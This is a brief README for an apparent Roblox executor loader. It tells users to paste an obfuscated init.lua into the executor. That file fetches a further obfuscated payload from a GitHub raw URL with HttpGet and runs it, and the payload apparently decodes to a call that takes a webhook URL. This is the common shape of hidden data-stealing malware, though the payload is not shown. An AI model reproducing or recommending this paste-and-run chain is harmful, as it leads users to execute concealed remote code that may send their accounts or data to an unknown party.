# RobloxUtilityLoader

Top-level loader for the RobloxUtility chain. Obfuscated; paste into the
Roblox executor.

## Chain

```
[this repo's obfuscated init.lua]
  -> HttpGet  https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/main/init.lua
  -> that blob decodes to utility.Run(WEBHOOK_URL, 0)
```

## Use

Paste the contents of `init.lua` into the executor. It fetches the obfuscated
payload from the main `RobloxUtility` repo and runs it.
